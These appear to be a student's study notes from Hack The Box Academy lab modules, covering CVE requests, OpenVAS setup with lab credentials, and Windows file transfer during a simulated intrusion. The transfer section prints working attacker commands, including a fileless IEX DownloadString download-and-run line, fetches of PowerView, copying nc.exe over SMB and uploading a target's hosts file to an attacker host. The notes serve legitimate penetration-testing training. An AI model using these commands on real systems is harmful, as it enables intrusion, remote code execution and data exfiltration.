<p>If a company is a part of participating CNA’s, they can assign a CVE ID for one of their products. If the issue is for a participating CNA, researchers can contact the appropriate CNA organization <a href="https://cve.mitre.org/cve/request_id.html">here</a>. If the vendor is not a participating CNA, a researcher should attempt to reach out to the vendor’s third-party coordinator.</p>

<h4 id="stage-4-requesting-cve-id-through-cve-web-form">Stage 4: Requesting CVE ID Through CVE Web Form</h4>

<p>The CVE Team has a form that can be filled out online <a href="https://cveform.mitre.org/">here</a> if the methods above do not work for CVE requests.</p>

<h4 id="stage-5-confirmation-of-cve-form">Stage 5: Confirmation of CVE Form</h4>

<p>Upon submitting the CVE Web Form mentioned in Stage 4, an individual will receive a confirmation email. The CVE team will contact the requestor if any additional information is required.</p>

<h4 id="stage-6-receival-of-cve-id">Stage 6: Receival of CVE ID</h4>

<p>Upon approval, the CVE Team will notify the requestor of a CVE ID if the affected product’s vulnerability is confirmed. Please note that the CVE ID is not public yet at this stage.</p>

<h4 id="stage-7-public-disclosure-of-cve-id">Stage 7: Public Disclosure of CVE ID</h4>

<p>CVE IDs can be announced to the public as soon as appropriate vendors and parties are aware of the issue to prevent duplication of CVE IDs. This stage ensures that all associated parties are aware of the problem before being publicly disclosed.</p>

<h4 id="stage-8-announcing-the-cve">Stage 8: Announcing the CVE</h4>

<p>The CVE Team asks researchers who are sharing multiple CVEs to ensure each CVE indicates the different vulnerabilities. Additional information can be found <a href="https://cve.mitre.org/cve/researcher_reservation_guidelines">here</a>.</p>

<h4 id="stage-9-providing-information-to-the-cve-team">Stage 9: Providing Information to The CVE Team</h4>

<p>At this stage, the CVE Team asks that the researcher help provide additional information to be used in the official CVE listing on the website. The <a href="https://nvd.nist.gov/">U.S. National Vulnerability Database (NVD)</a> maintains this information online in their database as well.</p>

<hr />

<h1 id="getting-started-with-openvas">Getting Started with OpenVAS</h1>

<p><a href="https://openvas.org/">OpenVAS</a>, by Greenbone Networks, is a publicly available vulnerability scanner. Greenbone Networks has an entire Vulnerability Manager, part of which is the OpenVAS scanner. Greenbone’s Vulnerability Manager is also open to the public and free to use. OpenVAS has the capabilities to perform network scans, including authenticated and unauthenticated testing.![[opena_vas.png]]</p>

<h2 id="installing-package">Installing Package</h2>

<p>First, we can start by installing the tool:</p>

<p>Getting Started with OpenVAS</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>apt-get update <span class="o">&amp;&amp;</span> apt-get <span class="nt">-y</span> full-upgrade
c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>apt-get <span class="nb">install </span>gvm <span class="o">&amp;&amp;</span> openvas

c0derpwner@htb[/htb]<span class="nv">$ </span>gvm-setup
</code></pre></div></div>

<p>then</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>gvm-start
</code></pre></div></div>

<p><strong>Note:</strong> The VM provided in the <code class="language-plaintext highlighter-rouge">OpenVAS Skills Assessment</code> section has OpenVAS pre-installed and the targets running. You can go to that section and start the VM and use OpenVAS throughout the module, which can be accessed at <code class="language-plaintext highlighter-rouge">https://&lt; IP &gt;:8080</code>. The OpenVAS credentials are: <code class="language-plaintext highlighter-rouge">htb-student</code>:<code class="language-plaintext highlighter-rouge">HTB_@cademy_student!</code>. You may also use these credentials to SSH into the target VM to configure OpenVAS.</p>

<p>The OpenVAS Greenbone Security Assistant application has various tabs that you can interact with. For this section, we will be digging into the scans. If you navigate to the <code class="language-plaintext highlighter-rouge">Scans</code> tab shown below, you will see the scans that have run in the past. You will also be able to see how to create a new task to run a scan. The tasks work off of the scanning configurations that the user sets up.</p>

<p><strong>Note:</strong> The scans shown in this section have already been pre-run to save you the time of waiting for them to finish. If you re-run the scan, it’s best to go through vulnerabilities as they come, instead of waiting for the scan to finish, as they can take 1-2 hours to finish.</p>

<p><strong>Note:</strong> To run a credentialed scan on the target, use the following credentials: 
<code class="language-plaintext highlighter-rouge">htb-student_adm</code>:<code class="language-plaintext highlighter-rouge">HTB_@cademy_student!</code> for Linux 
<code class="language-plaintext highlighter-rouge">administrator</code>:<code class="language-plaintext highlighter-rouge">Academy_VA_adm1!</code> for Windows. 
These scans have already been set up in the OpenVAS target to save you time.</p>

<p><strong>Note:</strong> For this module, the Windows target will be <code class="language-plaintext highlighter-rouge">172.16.16.100</code> and the Linux target will be <code class="language-plaintext highlighter-rouge">172.16.16.160</code>.</p>

<hr />

<h1 id="file-transfers">File Transfers</h1>
<p>#file-transfer #scp</p>

<p>There are many situations when transferring files to or from a target system is necessary. Let’s imagine the following scenario:</p>

<p><strong>Setting the Stage</strong></p>

<p>During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control">Application Control Policy</a>. We perform our local enumeration manually and find that we have <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege</a>. We need to transfer a binary to our target machine to escalate privileges using the <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> tool. We then try to use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Certutil</a> to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">Impacket smbserver</a> tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.</p>

<hr />

<h1 id="windows-file-transfer-methods">Windows File Transfer Methods</h1>

<h2 id="introduction">Introduction</h2>

<p>The Windows operating system h—as evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let’s use the <a href="https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/">Microsoft Astaroth Attack</a> blog post as an example of an advanced persistent threat (APT).</p>

<p>The blog post starts out talking about <a href="https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/">fileless threats</a>. The term <code class="language-plaintext highlighter-rouge">fileless</code> suggests that a threat doesn’t come in a file, they use legitimate tools built into a system to execute an attack. This doesn’t mean that there’s not a file transfer operation. As discussed later in this section, the file is not “present” on the system but runs in memory.</p>

<p>The <code class="language-plaintext highlighter-rouge">Astaroth attack</code> generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic">WMIC tool</a> with the “/Format” parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the <a href="https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool">Bitsadmin tool</a>.</p>

<p>All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32">regsvr32</a> tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the <code class="language-plaintext highlighter-rouge">Userinit</code> process. Below is a graphical depiction of the attack.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png" alt="Flowchart of a spear-phishing attack using WMIC, Bitsadmin, Certutil, and Regsvr32 to execute and inject malicious DLLs." /></p>

<p><a href="https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png">Image source</a></p>

<p>This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.</p>

<p>This section will discuss using some native Windows tools for download and upload operations. Later in the module, we’ll discuss <code class="language-plaintext highlighter-rouge">Living Off The Land</code> binaries on Windows &amp; Linux and how to use them to perform file transfer operations.</p>

<p>Windows File Transfer Methods</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">md5sum </span>id_rsa
<span class="go">
4e301756a07ded0a2dd6953abf015278  id_rsa
</span></code></pre></div></div>

<h4 id="pwnbox-encode-ssh-key-to-base64">Pwnbox Encode SSH Key to Base64</h4>

<p>Windows File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">cat </span>id_rsa |base64 <span class="nt">-w</span> 0<span class="p">;</span><span class="nb">echo

</span><span class="nv">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo</span><span class="o">=</span>
</code></pre></div></div>

<p>We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.</p>

<p>Windows File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\h</span>tb&gt; <span class="o">[</span>IO.File]::WriteAllBytes<span class="o">(</span><span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\P</span><span class="s2">ublic</span><span class="se">\i</span><span class="s2">d_rsa"</span>, <span class="o">[</span>Convert]::FromBase64String<span class="o">(</span><span class="s2">"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="</span><span class="o">))</span>
</code></pre></div></div>

<p>Finally, we can confirm if the file was transferred successfully using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2">Get-FileHash</a> cmdlet, which does the same thing that <code class="language-plaintext highlighter-rouge">md5sum</code> does.</p>

<h4 id="confirming-the-md5-hashes-match">Confirming the MD5 Hashes Match</h4>

<p>Windows File Transfer Methods</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-FileHash</span><span class="w"> </span><span class="nx">C:\Users\Public\id_rsa</span><span class="w"> </span><span class="nt">-Algorithm</span><span class="w"> </span><span class="nx">md5</span><span class="w">

</span><span class="n">Algorithm</span><span class="w">       </span><span class="nx">Hash</span><span class="w">                                                                   </span><span class="nx">Path</span><span class="w">
</span><span class="o">---------</span><span class="w">       </span><span class="o">----</span><span class="w">                                                                   </span><span class="o">----</span><span class="w">
</span><span class="n">MD5</span><span class="w">             </span><span class="nx">4E301756A07DED0A2DD6953ABF015278</span><span class="w">                                       </span><span class="nx">C:\Users\Public\id_rsa</span><span class="w">
</span></code></pre></div></div>

<p><strong>Note:</strong> While this method is convenient, it’s not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</p>

<h2 id="powershell-web-downloads">PowerShell Web Downloads</h2>

<p>Most companies allow <code class="language-plaintext highlighter-rouge">HTTP</code> and <code class="language-plaintext highlighter-rouge">HTTPS</code> outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.</p>

<p>PowerShell offers many file transfer options. In any version of PowerShell, the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a> class can be used to download a file over <code class="language-plaintext highlighter-rouge">HTTP</code>, <code class="language-plaintext highlighter-rouge">HTTPS</code> or <code class="language-plaintext highlighter-rouge">FTP</code>. The following <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0">table</a> describes WebClient methods for downloading data from a resource:</p>

<table>
  <thead>
    <tr>
      <th><strong>Method</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0">OpenRead</a></td>
      <td>Returns the data from a resource as a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0">Stream</a>.</td>
    </tr>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0">OpenReadAsync</a></td>
      <td>Returns the data from a resource without blocking the calling thread.</td>
    </tr>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0">DownloadData</a></td>
      <td>Downloads data from a resource and returns a Byte array.</td>
    </tr>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0">DownloadDataAsync</a></td>
      <td>Downloads data from a resource and returns a Byte array without blocking the calling thread.</td>
    </tr>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0">DownloadFile</a></td>
      <td>Downloads data from a resource to a local file.</td>
    </tr>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0">DownloadFileAsync</a></td>
      <td>Downloads data from a resource to a local file without blocking the calling thread.</td>
    </tr>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">DownloadString</a></td>
      <td>Downloads a String from a resource and returns a String.</td>
    </tr>
    <tr>
      <td><a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0">DownloadStringAsync</a></td>
      <td>Downloads a String from a resource without blocking the calling thread.</td>
    </tr>
  </tbody>
</table>

<p>Let’s explore some examples of those methods for downloading files using PowerShell.</p>

<h4 id="powershell-downloadfile-method">PowerShell DownloadFile Method</h4>

<p>We can specify the class name <code class="language-plaintext highlighter-rouge">Net.WebClient</code> and the method <code class="language-plaintext highlighter-rouge">DownloadFile</code> with the parameters corresponding to the URL of the target file to download and the output file name.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\h</span>tb&gt; <span class="c"># Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')</span>
PS C:<span class="se">\h</span>tb&gt; <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'</span>,<span class="s1">'C:\Users\Public\Downloads\PowerView.ps1'</span><span class="o">)</span>

PS C:<span class="se">\h</span>tb&gt; <span class="c"># Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')</span>
PS C:<span class="se">\h</span>tb&gt; <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadFileAsync<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'</span>, <span class="s1">'C:\Users\Public\Downloads\PowerViewAsync.ps1'</span><span class="o">)</span>
</code></pre></div></div>

<h4 id="powershell-downloadstring---fileless-method">PowerShell DownloadString - Fileless Method</h4>

<p>As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2">Invoke-Expression</a> cmdlet or the alias <code class="language-plaintext highlighter-rouge">IEX</code>.</p>

<p>Windows File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\h</span>tb&gt; IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/EmpireProject/Empire/maste
</span></code></pre></div></div>

<h2 id="smb-downloads">SMB Downloads</h2>
<p>#impacket-smbserver</p>

<p>The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.</p>

<p>We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver.py</a> from Impacket and then use <code class="language-plaintext highlighter-rouge">copy</code>, <code class="language-plaintext highlighter-rouge">move</code>, PowerShell <code class="language-plaintext highlighter-rouge">Copy-Item</code>, or any other tool that allows connection to SMB.</p>

<h4 id="create-the-smb-server">Create the SMB Server</h4>

<p>Windows File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>impacket-smbserver share <span class="nt">-smb2support</span> /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>
<p>or</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>impacket-smbserver share <span class="nt">-smb2support</span> /tmp/smbshare <span class="nt">-user</span> <span class="nb">test</span> <span class="nt">-password</span> <span class="nb">test

</span>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<h4 id="copy-a-file-from-the-smb-server">Copy a File from the SMB Server</h4>

<p>Windows File Transfer Methods</p>

<pre><code class="language-cmd">C:\htb&gt; copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
</code></pre>

<h4 id="mount-the-smb-server-with-username-and-password">Mount the SMB Server with Username and Password</h4>

<p>Windows File Transfer Methods</p>

<pre><code class="language-cmd">C:\htb&gt; net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb&gt; copy n:\nc.exe
        1 file(s) copied.
</code></pre>

<h2 id="ftp-downloads">FTP Downloads</h2>

<p>Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">--port</span> 21  
<span class="o">[</span>I 2025-03-29 19:17:05] concurrency model: async  
<span class="o">[</span>I 2025-03-29 19:17:05] masquerade <span class="o">(</span>NAT<span class="o">)</span> address: None  
<span class="o">[</span>I 2025-03-29 19:17:05] passive ports: None  
<span class="o">[</span>I 2025-03-29 19:17:05] <span class="o">&gt;&gt;&gt;</span> starting FTP server on 0.0.0.0:21, <span class="nv">pid</span><span class="o">=</span>9163 <span class="o">&lt;&lt;&lt;</span>
</code></pre></div></div>

<h4 id="transferring-files-from-an-ftp-server-using-powershell">Transferring Files from an FTP Server Using PowerShell</h4>

<p>Windows File Transfer Methods</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'ftp://192.168.49.128/file.txt'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Users\Public\ftp-file.txt'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<h4 id="create-a-command-file-for-the-ftp-client-and-download-the-target-file">Create a Command File for the FTP Client and Download the Target File</h4>

<p>Windows File Transfer Methods</p>

<pre><code class="language-cmd">C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
C:\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt
C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt

C:\htb&gt; ftp -v -n -s:ftpcommand.txt
ftp&gt; open 192.168.49.128
Log in with USER and PASS first.
ftp&gt; USER anonymous

ftp&gt; GET file.txt
ftp&gt; bye

C:\htb&gt;more file.txt
This is a test file
</code></pre>

<h2 id="ftp-uploads">FTP Uploads</h2>

<p>Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module <code class="language-plaintext highlighter-rouge">pyftpdlib</code>, we need to specify the option <code class="language-plaintext highlighter-rouge">--write</code> to allow clients to upload files to our attack host.</p>

<p>Windows File Transfer Methods</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> pyftpdlib <span class="nt">--port</span> 21 <span class="nt">--write</span>

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn<span class="o">(</span><span class="s2">"write permissions assigned to anonymous user."</span>,
<span class="o">[</span>I 2022-05-18 10:33:31] concurrency model: async
<span class="o">[</span>I 2022-05-18 10:33:31] masquerade <span class="o">(</span>NAT<span class="o">)</span> address: None
<span class="o">[</span>I 2022-05-18 10:33:31] passive ports: None
<span class="o">[</span>I 2022-05-18 10:33:31] <span class="o">&gt;&gt;&gt;</span> starting FTP server on 0.0.0.0:21, <span class="nv">pid</span><span class="o">=</span>5155 <span class="o">&lt;&lt;&lt;</span>
</code></pre></div></div>

<p>Now let’s use the PowerShell upload function to upload a file to our FTP Server.</p>

<h4 id="powershell-upload-file">PowerShell Upload File</h4>

<p>Windows File Transfer Methods</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">UploadFile</span><span class="p">(</span><span class="s1">'ftp://192.168.49.128/ftp-hosts'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Windows\System32\drivers\etc\hosts'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<h3 id="powershell-base64-web-upload">PowerShell Base64 Web Upload</h3>

<p>Another way to use PowerShell and base64 encoded files for upload operations is by using <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code> or <code class="language-plaintext highlighter-rouge">Invoke-RestMethod</code> together with Netcat. We use Netcat to listen in on a port we specify and send the file as a <code class="language-plaintext highlighter-rouge">POST</code> request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.</p>

<p>Windows File Transfer Methods</p>

